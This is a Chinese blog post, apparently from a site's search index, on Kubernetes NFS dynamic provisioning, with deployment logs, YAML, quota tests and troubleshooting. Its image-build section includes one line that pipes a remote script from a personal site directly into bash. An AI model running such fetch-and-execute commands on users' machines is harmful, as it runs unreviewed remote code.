","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:6:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"部署 kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/rbac.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/deployment.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/class.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml kubectl get pv kubectl get pvc 部署信息 [root@node131 nfs]# kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/deployment.yaml serviceaccount/nfs-provisioner created service/nfs-provisioner created deployment.apps/nfs-provisioner created [root@node131 nfs]# ls custom-nfs-busybox-rc.yaml custom-nfs-pv.yaml nfs-busybox-rc.yaml nfs-pvc.yaml nfs-server-rc.yaml nfs-web-service.yaml test custom-nfs-centos-rc.yaml custom-nfs-server-rc.yaml nfs-data nfs-pv.png nfs-server-service.yaml provisioner custom-nfs-pvc.yaml deploy nfsmount.conf nfs-pv.yaml nfs-web-rc.yaml README.md [root@node131 nfs]# kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/class.yaml storageclass.storage.k8s.io/example-nfs created [root@node131 nfs]# kubectl get sc NAME PROVISIONER RECLAIMPOLICY VOLUMEBINDINGMODE ALLOWVOLUMEEXPANSION AGE example-nfs example.com/nfs Delete Immediate false 43s [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl describe sc Name: example-nfs IsDefaultClass: No Annotations: \u003cnone\u003e Provisioner: example.com/nfs Parameters: \u003cnone\u003e AllowVolumeExpansion: \u003cunset\u003e MountOptions: vers=4.1 ReclaimPolicy: Delete VolumeBindingMode: Immediate Events: \u003cnone\u003e [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pv No resources found [root@node131 nfs]# kubectl get pvc No resources found in default namespace. [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml persistentvolumeclaim/nfs created [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Bound pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX example-nfs 3s [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pv NAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX Delete Bound default/nfs example-nfs 5s [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Bound pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX example-nfs 20s [root@node131 nfs]# kubectl describe pvc Name: nfs Namespace: default StorageClass: example-nfs Status: Bound Volume: pvc-26703096-84df-4c18-88f5-16d0b09be156 Labels: \u003cnone\u003e Annotations: pv.kubernetes.io/bind-completed: yes pv.kubernetes.io/bound-by-controller: yes volume.beta.kubernetes.io/storage-provisioner: example.com/nfs Finalizers: [kubernetes.io/pvc-protection] Capacity: 1Mi Access Modes: RWX VolumeMode: Filesystem Used By: \u003cnone\u003e Events: Type Reason Age From Message ---- ------ ---- ---- ------- Normal ExternalProvisioning 27s (x2 over 27s) persistentvolume-controller waiting for a volume to be created, either by external provisioner \"example.com/nfs\" or manually created by system administrator Normal Provisioning 27s example.com/nfs_nfs-provisioner-66ccf9bc7b-jpm2w_9633218c-812f-4e94-b77e-9f922ec2edb6 External provisioner is provisioning volume for claim \"default/nfs\" Normal ProvisioningSucceeded 27s example.com/nfs_nfs-provisioner-66ccf9bc7b-jpm2w_9633218c-812f-4e94-b77e-9f922ec2edb6 Successfully provisioned volume pvc-26703096-84df-4c18-88f5-16d0b09be156 [root@node131 nfs]# [root@node131 nfs]# kubectl describe pv Name: pvc-26703096-84df-4c18-88f5-16d0b09be156 Labels: \u003cnone\u003e Annotations: EXPORT_block: EXPORT { Export_Id = 1; Path = /export/pvc-26703096-84df-4c18-88f5-16d0b09be156; Pseudo = /export/pvc-26703096-84df-4c18-88f5-16d0b09be156; Access_Type = RW; Squash = no_root_squash; SecType = sys; Filesystem_id = 1.1; FSAL","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:7:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"卸载删除 kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/class.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/deployment.yaml kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/rbac.yaml ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:8:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"测试验证 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:9:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"存储写操作 kind:PodapiVersion:v1metadata:name:write-podspec:containers:- name:write-podimage:busyboximagePullPolicy:IfNotPresentcommand:- \"/bin/sh\"args:- \"-c\"- \"touch /mnt/SUCCESS \u0026\u0026 exit 0 || exit 1\"volumeMounts:- name:nfs-pvcmountPath:\"/mnt\"restartPolicy:\"Never\"volumes:- name:nfs-pvcpersistentVolumeClaim:claimName:nfs pod使用nfs pvc写操作，即往挂载路径/srv/pvc-idxxxxx/ 写 kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/write-pod.yaml [root@node131 srv]# cd pvc-26703096-84df-4c18-88f5-16d0b09be156/ [root@node131 pvc-26703096-84df-4c18-88f5-16d0b09be156]# ll 总用量 0 -rw-r--r--. 1 root root 0 2月 8 11:16 SUCCESS ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:9:1","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"存储读操作 kind:PodapiVersion:v1metadata:name:read-podspec:containers:- name:read-podimage:busyboximagePullPolicy:IfNotPresentcommand:- \"/bin/sh\"args:- \"-c\"- \"test -f /mnt/SUCCESS \u0026\u0026 exit 0 || exit 1\"volumeMounts:- name:nfs-pvcmountPath:\"/mnt\"restartPolicy:\"Never\"volumes:- name:nfs-pvcpersistentVolumeClaim:claimName:nfs pod使用nfs pvc读操作，即往挂载路径/srv/pvc-idxxxxx/ 读 kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/read-pod.yaml pod运行情况 [root@node131 pvc-26703096-84df-4c18-88f5-16d0b09be156]# kubectl get po -A NAMESPACE NAME READY STATUS RESTARTS AGE default nfs-provisioner-66ccf9bc7b-jpm2w 1/1 Running 0 38m default read-pod 0/1 Completed 0 7s default write-pod 0/1 Completed 0 8m43s kube-system calico-kube-controllers-65b86747bd-c4qsp 1/1 Running 16 47d kube-system calico-node-lglh4 1/1 Running 18 47d kube-system coredns-8677555d68-jwggm 1/1 Running 4 6d1h kube-system kube-apiserver-node131 1/1 Running 16 47d kube-system kube-controller-manager-node131 1/1 Running 17 47d kube-system kube-proxy-mktp9 1/1 Running 16 47d kube-system kube-scheduler-node131 1/1 Running 17 47d kube-system nodelocaldns-lfjzs 1/1 Running 16 47d ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:9:2","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"业务pod使用pvc时，删除pvc 业务pod状态为complete状态，进行delete pvc操作 此时命令会阻塞，pvc状态为保护过程中的Terminating [root@node131 nfs]# kubectl delete -f deploy/kubernetes_incubator_nfs_provisioner/claim.yaml persistentvolumeclaim \"nfs\" deleted ^C [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Terminating pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX example-nfs 39m 无业务pod使用pvc时，删除pvc [root@node131 nfs]# kubectl delete po write-pod pod \"write-pod\" deleted [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc NAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE nfs Terminating pvc-26703096-84df-4c18-88f5-16d0b09be156 1Mi RWX example-nfs 41m [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl delete po read-pod pod \"read-pod\" deleted [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pvc No resources found in default namespace. [root@node131 nfs]# 上面阻塞的delete pvc操作，会删除pvc，同时由于pv的delete回收策略，该pvc对应的存储挂载目录也会删除 [root@node131 nfs]# kubectl get pvc No resources found in default namespace. [root@node131 nfs]# [root@node131 nfs]# [root@node131 nfs]# kubectl get pv No resources found [root@node131 nfs]# [root@node131 srv]# ll 总用量 16 -rw-r--r--. 1 root root 5140 2月 8 11:32 ganesha.log -rw-------. 1 root root 36 2月 8 10:46 nfs-provisioner.identity drwxr-xr-x. 3 root root 19 2月 8 10:46 v4old drwxr-xr-x. 3 root root 19 2月 8 10:46 v4recov -rw-------. 1 root root 667 2月 8 11:32 vfs.conf [root@node131 srv]# ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:9:3","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"配额测试 部署pod kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/custom-nfs-busybox-rc.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/nfs-web-rc.yaml kubectl create -f deploy/kubernetes_incubator_nfs_provisioner/test_pod/nfs-web-service.yaml 挂载目录下的数据情况，新增了index.html [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# ll -h 总用量 4.0K -rw-r--r--. 1 root root 611 2月 8 14:15 index.html -rw-r--r--. 1 root root 0 2月 8 11:57 SUCCESS [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# cat index.html Mon Feb 8 06:14:38 UTC 2021 nfs-busybox-54846 Mon Feb 8 06:14:39 UTC 2021 nfs-busybox-8fqcr Mon Feb 8 06:14:44 UTC 2021 测试pvc的容量为1M，在挂载目录/srv/pvc-4f32a250-f6da-4534-80fd-196221b555d9下，写入个2M大小的文件。查看测试pod是否还能继续写入数据，观察可知，在nfs provisoner的默认参数下，测试pod还能继续往挂载目录中写入数据。index.html大小由11k新增到了14k并继续增加 [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# ll -h 总用量 2.1M -rw-r--r--. 1 root root 11K 2月 8 14:28 index.html -rw-r--r--. 1 root root 0 2月 8 11:57 SUCCESS -rw-r--r--. 1 root root 2.0M 2月 8 14:25 tmp.2M [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# pwd /srv/pvc-4f32a250-f6da-4534-80fd-196221b555d9 [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# ll -h 总用量 2.1M -rw-r--r--. 1 root root 14K 2月 8 14:31 index.html -rw-r--r--. 1 root root 0 2月 8 11:57 SUCCESS -rw-r--r--. 1 root root 2.0M 2月 8 14:25 tmp.2M [root@node131 pvc-4f32a250-f6da-4534-80fd-196221b555d9]# 目录挂载情况，有2个写pod和2个读pod共4个业务pod在运行 [root@node131 2129b202-2d91-400f-b04e-5e57f9c105b6]# mount |grep pvc 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 on /var/lib/kubelet/pods/69448210-b1c1-4444-8c24-29024770acff/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 type nfs4 (rw,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.233.14.76,local_lock=none,addr=10.233.14.76) 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 on /var/lib/kubelet/pods/337827e0-4924-4afb-b41e-a19c522d59d6/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 type nfs4 (rw,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.233.14.76,local_lock=none,addr=10.233.14.76) 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 on /var/lib/kubelet/pods/888dd122-e529-4f36-bca4-828667c997dd/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 type nfs4 (rw,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.233.14.76,local_lock=none,addr=10.233.14.76) 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 on /var/lib/kubelet/pods/0298070d-66e2-43e1-947c-d4ae0f5fab4b/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 type nfs4 (rw,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=10.233.14.76,local_lock=none,addr=10.233.14.76) [root@node131 2129b202-2d91-400f-b04e-5e57f9c105b6]# 删除测试pod，保留pv和pvc，检查挂载目录仍然存在。此时挂载目录大小\u003e2M 再重新部署测试pod，发现部署成功，说明pod使用pvc请求容量大小时并不检查挂载目录pvc要求数据大小。 实际上挂载了整个容量大小，如下图。 [root@node131 srv]# df -hT |grep pvc 文件系统 类型 容量 已用 可用 已用% 挂载点 10.233.14.76:/export/pvc-4f32a250-f6da-4534-80fd-196221b555d9 nfs4 17G 11G 6.8G 61% /var/lib/kubelet/pods/06940ab3-4d60-4015-8c39-3bb15b331e7f/volumes/kubernetes.io~nfs/pvc-4f32a250-f6da-4534-80fd-196221b555d9 考虑开启配额参数 删除原有 nfs_provisioner，修改 nfs_provisioner参数后，部署 kube","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:9:4","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"nfs-client-provisioner 如果集群系统中已有存储系统服务，则可使用nfs-subdir-external-provisioner项目组件来提供动态pv支持 Kubernetes NFS-Client Provisioner NFS subdir external provisioner is an automatic provisioner that use your existing and already configured NFS server to support dynamic provisioning of Kubernetes Persistent Volumes via Persistent Volume Claims. Persistent volumes are provisioned as ${namespace}-${pvcName}-${pvName}. nfs-subdir-external-provisioner ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:10:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"make container # export GOPATH=/home/wangb/projects export GO111MODULE=on # export GO111MODULE=off # go env -w GOPROXY=https://goproxy.cn,direct # 进入项目目录 # 下载依赖 go mod tidy # 生成项目vendor go mod vendor # fix bug : gcr.io/distroless/static:latest pull failed docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/distroless/static:latest ## 镜像制作 # 基础镜像 curl -s https://zhangguanzhang.github.io/bash/pull.sh | bash -s -- gcr.io/distroless/static:latest # 制作 make container # 镜像名称和标签 # `nfs-subdir-external-provisioner:latest` will be created. ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:10:1","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"配置文件 deployment apiVersion:apps/v1kind:Deploymentmetadata:name:nfs-client-provisionerlabels:app:nfs-client-provisioner# replace with namespace where provisioner is deployednamespace:defaultspec:replicas:1strategy:type:Recreateselector:matchLabels:app:nfs-client-provisionertemplate:metadata:labels:app:nfs-client-provisionerspec:serviceAccountName:nfs-client-provisionercontainers:- name:nfs-client-provisioner# image: gcr.io/k8s-staging-sig-storage/nfs-subdir-external-provisioner:v4.0.0image:nfs-subdir-external-provisioner:latestimagePullPolicy:\"IfNotPresent\"volumeMounts:- name:nfs-client-rootmountPath:/persistentvolumesenv:- name:PROVISIONER_NAMEvalue:k8s-sigs.io/nfs-subdir-external-provisioner- name:NFS_SERVERvalue:192.168.11.54- name:NFS_PATHvalue:/mnt/inspurfsvolumes:- name:nfs-client-rootnfs:server:192.168.11.54path:/mnt/inspurfs storage class apiVersion:storage.k8s.io/v1kind:StorageClassmetadata:name:managed-nfs-storageprovisioner:k8s-sigs.io/nfs-subdir-external-provisioner# or choose another name, must match deployment's env PROVISIONER_NAME'parameters:pathPattern:\"${.PVC.namespace}/${.PVC.annotations.nfs.io/storage-path}\"# waits for nfs.io/storage-path annotation, if not specified will accept as empty string.archiveOnDelete:\"false\" pvc kind:PersistentVolumeClaimapiVersion:v1metadata:name:test-claimannotations:nfs.io/storage-path:\"test-path\"# not required, depending on whether this annotation was shown in the storage class descriptionspec:storageClassName:managed-nfs-storageaccessModes:- ReadWriteManyresources:requests:storage:1Mi ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:10:2","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"部署 kubectl create -f custom_deploy/rbac.yaml kubectl create -f custom_deploy/deployment.yaml kubectl create -f custom_deploy/class.yaml kubectl create -f custom_deploy/test-claim.yaml -f custom_deploy/test-pod.yaml kubectl create -f custom_deploy/run-test-pod.yaml ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:10:3","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"问题结论 PV共用机制，是否可以做到超分？是否可以有用户的概念？ 一个pv只能被一个pvc使用，pv实际上k8s的一种资源类型（类比node），没有用户的概念。用户可见并使用的是pvc，多个用户（pod）可以使用相同的pvc。 配额是依赖底层存储配置参数实现，如果使用pvc实现，则需要使用pv-provisioner封装存储组件来支持配额功能，此时由于对目录的配额限制会导致无法超分。 nfs的pvc 能否控制住大小？ pvc可以request使用量大小，但不是pvc和k8s来控制大小，实际上通过nfs的配额参数和xfs文件系统的存储配额参数设置实现 k8s只是通过pv和pvc管理存储信息，并通过kubelet的volume manager对存储目录进行挂载和卸载操作 PV对多个Pod使用时，能否控制总量？ pod不直接使用pv，而是通过pv声明pvc方式来绑定pv使用 目前，如果不通过storageclass的动态方式（手动创建pv），或者storageclass中nfs-provision不使用配额参数，则无法实现存储总量控制。 PV是否能在线更新，比如扩容？ 无论是手动创建pv还是动态创建pv，如果直接修改pv（如，pv的Capacity从1M调整到2M），修改生效。但之前已创建的pvc的Capacity并没有发生变化（仍是原来的1M）。 如果通过修改pvc来更新存储资源pv的配置。需使用storageclass方式可以实现pvc-\u003epv的容量关联扩容。只有动态供应的pvc可以调整大小，供应pvc的存储类型必须支持调整大小。即满足如下条件： Kube-ApiServer 参数：PersistentVolumeClaimResize插件 使能 StorageClass 配置yaml的allowVolumeExpansion设置为true 在官方文档对StorageClass扩容支持的存储类型范围内 nfs无法通过通过pvc的resize扩容操作，来自动关联修改pv 如果底层存储出问题，k8s是否能够感知管理，故障恢复。 底层存储依赖于具体存储组件（如：nfs）实现的异常处理。或考虑把nfs组件封装成nfs-server + nfs-provisioner 当做k8s集群中的pod管理起来。 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:11:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"参考 持久存储设计文档 存储类StorageClass nfs-subdir-external-provisioner https://www.cnblogs.com/panwenbin-logs/p/12196286.html ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:12:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"附录 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:13:0","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"配置 StorageClass class.yaml kind:StorageClassapiVersion:storage.k8s.io/v1metadata:name:example-nfsprovisioner:example.com/nfsmountOptions:- vers=4.1 PersistentVolumeClaim claim.yaml kind:PersistentVolumeClaimapiVersion:v1metadata:name:nfsspec:storageClassName:example-nfsaccessModes:- ReadWriteManyresources:requests:storage:1Mi ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:13:1","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"dd命令 构造指定大小文件 # 从/dev/null每次读取1G数据，读5次，写入tmp.5G这个文件 # dd if=/dev/zero of=tmp.5G bs=1G count=5 dd if=/dev/zero of=tmp.2M bs=1M count=2 if=FILE : 指定输入文件，若不指定则从标注输入读取。这里指定为/dev/zero是Linux的一个伪文件，它可以产生连续不断的null流（二进制的0） of=FILE : 指定输出文件，若不指定则输出到标准输出 bs=BYTES : 每次读写的字节数，可以使用单位K、M、G等等。另外输入输出可以分别用ibs、obs指定，若使用bs，则表示是ibs和obs都是用该参数 count=BLOCKS : 读取的block数，block的大小由ibs指定（只针对输入参数） ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:13:2","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"开启xfs的quota特性 #什么结果都没有，这个表示没有设置配额 xfs_quota -x -c 'report' / mount -o remount,rw,uquota,prjquota / # 在开始划分分区的时候就要让分区的配额生效，添加一块硬盘作为docker的数据目录 #fdisk -l | grep sdb #Disk /dev/sdb: 53.7 GB, 53687091200 bytes, 104857600 sector 编辑/etc/fstab vi /etc/fstab [root@node131 nfs]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Thu Dec 17 15:27:09 2020 # # Accessible filesystems, by reference, are maintained under '/dev/disk' # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # #/dev/mapper/centos_master-root / xfs defaults 0 0 /dev/mapper/centos_master-root / xfs defaults,usrquota,grpquota 0 0 UUID=d13f3d45-3ac2-4cda-b1ce-715d3153a900 /boot xfs defaults 0 0 注，类型如下： 根据用户(uquota/usrquota/quota) 根据组(gquota/grpquota) 根据目录(pquota/prjquota)(不能与grpquota同时设定) 卸载并重新挂载 #umount /home #mount -a #由于挂载了 /目录，采用重启操作 rebot now 2.2.3 检查 # mount | grep home mount | grep centos [root@node131 ~]# mount | grep centos /dev/mapper/centos_master-root on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota) [root@node131 ~]# 结果：在本地虚拟机环境未生效，操作未成功。。。 ","date":"2021-02-08","objectID":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/:13:3","tags":["K8S"],"title":"k8s dynamic provisioning and storage 介绍","uri":"/posts/2021/02/k8s-dynamic-provisioning-and-storage-%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"错误 新项目代码无法进行镜像制作 make container报错信息见下 [root@node1 nfs-ganesha-server-and-external-provisioner-master]# make container ./release-tools/verify-go-version.sh \"go\" fatal: Not a git repository (or any parent up to mount point /home) Stopping at filesystem boundary (GIT_DISCOVERY_ACROSS_FILESYSTEM not set). mkdir -p bin echo '' | tr ';' '\\n' | while read -r os arch suffix; do \\ if ! (set -x; CGO_ENABLED=0 GOOS=\"$os\" GOARCH=\"$arch\" go build -a -ldflags ' -X main.version= -extldflags \"-static\"' -o \"./bin/nfs-provisioner$suffix\" ./cmd/nfs-provisioner); then \\ echo \"Building nfs-provisioner for GOOS=$os GOARCH=$arch failed, see error(s) above.\"; \\ exit 1; \\ fi; \\ done + CGO_ENABLED=0 + GOOS= + GOARCH= + go build -a -ldflags ' -X main.version= -extldflags \"-static\"' -o ./bin/nfs-provisioner ./cmd/nfs-provisioner fatal: Not a git repository (or any parent up to mount point /home) Stopping at filesystem boundary (GIT_DISCOVERY_ACROSS_FILESYSTEM not set). docker build -t nfs-provisioner:latest -f Dockerfile --label revision= . Sending build context to Docker daemon 69.19MB Step 1/19 : FROM fedora:30 AS build 30: Pulling from library/fedora 401909e6e2aa: Pull complete Digest: sha256:3a0c8c86d8ac2d1bbcfd08d40d3b757337f7916fb14f40efcb1d1137a4edef45 Status: Downloaded newer image for fedora:30 ---\u003e 177d5adf0c6c Step 2/19 : RUN dnf install -y tar gcc cmake-3.14.2-1.fc30 autoconf libtool bison flex make gcc-c++ krb5-devel dbus-devel jemalloc-devel libnfsidmap-devel libnsl2-devel userspace-rcu-devel patch libblkid-devel ---\u003e Running in b6cb5632e5a4 Fedora Modular 30 - x86_64 0.0 B/s | 0 B 04:00 Errors during downloading metadata for repository 'fedora-modular': - Curl error (6): Couldn't resolve host name for https://mirrors.fedoraproject.org/metalink?repo=fedora-modular-30\u0026arch=x86_64 [Could not resolve host: mirrors.fedoraproject.org] Error: Failed to download metadata for repo 'fedora-modular': Cannot prepare internal mirrorlist: Curl error (6): Couldn't resolve host name for https://mirrors.fedoraproject.org/metalink?repo=fedora-modular-30\u0026arch=x86_64 [Could not resolve host: mirrors.fedoraproject.org] The command '/bin/sh -c dnf install -y tar gcc cmake-3.14.2-1.fc30 autoconf libtool bison flex make gcc-c++ krb5-devel dbus-devel jemalloc-devel libnfsidmap-devel libnsl2-devel userspace-rcu-devel patch libblkid-devel' returned a non-zero code: 1 make: *** [container-nfs-provisioner] Error 1 [root@node1 nfs-ganesha-server-and-external-provisioner-master]# 改用直接拉取镜像方式获得。 开启配额参数， nfs provisioner 启动报错 报错信息 Error creating xfs quotaer! xfs path /export was not mounted with pquota nor prjquota 系统的挂载盘使用的是xfs文件系统的默认参数，没有开启配额功能 所以无法挂载成功 [root@node131 /]# mount | grep centos /dev/mapper/centos_master-root on / type xfs (rw,relatime,seclabel,attr2,inode64,noquota) [root@node131 /]# cat /etc/fstab # # /etc/fstab # Created by anaconda on Thu Dec 17 15:27:09 2020 # # Accessible filesystems, by reference, are maintained under '/dev/disk' # See man pages fstab(5), findfs(8), mount(8) and/or blkid(8) for more info # /dev/mapper/centos_master-root / xfs defaults 0 0 UUID=d13f3d45-3ac2-4cda-b1ce-715d3153a900 /boot xfs defaults 0 0 https://kim1024.github.io/2018/11/27/quota-with-xfs.html https://blog.csdn.net/weixin_36458030/article/details/112232427 CentOS关于quota的总结与实践 https://blog.csdn.net/mnasd/article/details/80766756 